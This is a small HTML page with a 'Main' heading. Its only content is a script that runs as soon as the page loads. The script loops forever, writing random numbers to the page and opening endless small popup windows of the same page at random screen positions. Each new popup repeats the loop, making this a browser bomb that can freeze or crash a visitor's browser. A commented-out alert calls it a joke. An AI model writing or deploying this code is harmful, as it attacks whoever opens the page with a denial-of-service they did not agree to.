<html>
<head>
</head>
    <body>
	<h1>Main</h1>
	<script async fetchpriority="high">
		var url = window.location.href; // Get the current URL of the webpage
		var w = window.screen.width;
		var h = window.screen.height;
		var max=10000000;
		var min=1;
		var min1=10;

		while (true){
			var x=Math.floor(Math.random() * (max - min + 1)) + min;
			var width=Math.floor(Math.random() * (h - min1 + 1)) + min1;
			var height=Math.floor(Math.random() * (w - min1 + 1)) + min1;
			document.write(x);
			window.open(url, x ,`width=100,height=100,top=${width},left=${height}`);
			//window.moveBy(y,y);
			//window.open(url); // This line is redundant
		}
		//window.alert("why did you try this its a joke and you should not have access to this unless you are stupid");
	</script>
    </body>
</html>
